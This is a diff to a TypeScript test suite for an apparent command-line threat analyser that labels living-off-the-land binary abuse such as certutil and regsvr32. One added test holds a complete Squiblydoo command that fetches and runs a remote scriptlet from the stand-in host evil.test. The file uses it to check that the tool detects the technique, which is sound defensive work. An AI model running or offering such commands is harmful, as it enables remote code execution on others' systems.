@@ -127,8 +127,8 @@ describe('deriveBullets — per-LOLBin bullets off the generic lolbin signal (SO
   const LOLBIN_EXPECT: Record<string, string> = {
     certutil: 'Decodes/downloads a payload via certutil',
     bitsadmin: 'Fetches a file via bitsadmin/BITS transfer',
-    regsvr32: 'Registers and executes a remote script via regsvr32 (Squiblydoo)',
-    rundll32: 'Executes code via rundll32',
+    regsvr32: 'Executes regsvr32 against a remote target',
+    rundll32: 'Executes code via a rundll32 proxy invocation',
     wmic: 'Executes via wmic',
   }
   for (const [bin, text] of Object.entries(LOLBIN_EXPECT)) {
@@ -489,5 +489,16 @@ describe('whole-branch review regressions (2026-08-19)', () => {
     const evade = r.bullets.find((b) => b.verb === 'Runs')
     expect(evade).toBeTruthy()
     expect(evade!.text).toBe('Runs with evasion flags (hidden, no-profile)')
+  })
+})
+
+describe('LOLBin narrative no-invent (review 2.3, sample 7)', () => {
+  it('benign regsvr32 /u produces NO regsvr32 bullet', async () => {
+    const r = await analyze('regsvr32 /u /s C:\\Program Files\\MyApp\\shell-extension.dll')
+    expect(r.bullets.some((b) => /regsvr32/i.test(b.text))).toBe(false)
+  })
+  it('real Squiblydoo produces the Squiblydoo bullet', async () => {
+    const r = await analyze('regsvr32 /s /n /u /i:http://evil.test/a.sct scrobj.dll')
+    expect(r.bullets.some((b) => /squiblydoo/i.test(b.text))).toBe(true)
   })
 })
